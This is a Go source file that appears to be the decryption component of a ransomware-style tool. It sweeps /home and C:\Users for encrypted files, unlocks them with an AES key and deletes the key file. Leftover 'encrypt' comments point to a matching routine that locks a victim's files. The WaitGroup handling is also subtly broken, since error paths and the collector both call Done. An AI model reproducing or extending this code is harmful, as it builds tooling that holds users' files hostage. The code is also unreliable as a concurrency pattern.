package system

import (
	"fmt"
	"os"
	"runtime"
	"sync"
	"time"

	"frostbite.com/tools/file"
	scan "frostbite.com/tools/scan"
	humanize "github.com/dustin/go-humanize"
)

func WholeSystemDecrypt(aesKey []byte) {

	//set variables
	//set variables
	var (
		filesToDecrypt []string
		// sizeOfFoundFiles int64
	)
	dirsToScan := []string{
		"/home",
		"C:\\Users",
	}
	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}
	timeNow := time.Now()

	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
	pl("dirsToScan: ", dirsToScan)

	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	// listen for channel and append to filesToDecrypt
	filesToDecrypt = getAllEncFiles(dirsToScan)
	// encrypt files
	pl("Unlocking...")
	file.UnlockFilesArray(filesToDecrypt, aesKey)

	timeEnd := time.Now()
	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToDecrypt))))
	// print human readable size
	pl("Time elapsed: ", timeEnd.Sub(timeNow))
	os.Remove("decrypted.key")

}
func getAllEncFiles(dirsToScan []string) []string {
	wg := sync.WaitGroup{}
	wg.Add(len(dirsToScan))

	filesToEncrypt := make([]string, 0)
	chanFilesScanned := make(chan []string)

	for _, dir := range dirsToScan {
		go goroutineScanDirDecrypt(dir, &wg, chanFilesScanned)
	}

	go func() {
		for range dirsToScan {
			files := <-chanFilesScanned
			filesToEncrypt = append(filesToEncrypt, files...)
			wg.Done()
		}
	}()

	wg.Wait()
	return filesToEncrypt
}

func goroutineScanDirDecrypt(dir string, wg *sync.WaitGroup, chanFilesScanned chan<- []string) {

	_, err := os.Stat(dir)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("Dir does not exist: ", dir)
			wg.Done()
		}
	} else {
		pl("Scanning: ", dir)
		files, err := scan.ScanForEncFilesInDir(dir, true)
		if err != nil {
			fmt.Println("Error: ", err)
			wg.Done()
		}
		//send files to channel
		chanFilesScanned <- files

		pl("Files found in this dir: ", humanize.Comma(int64(len(files))))
	}
}
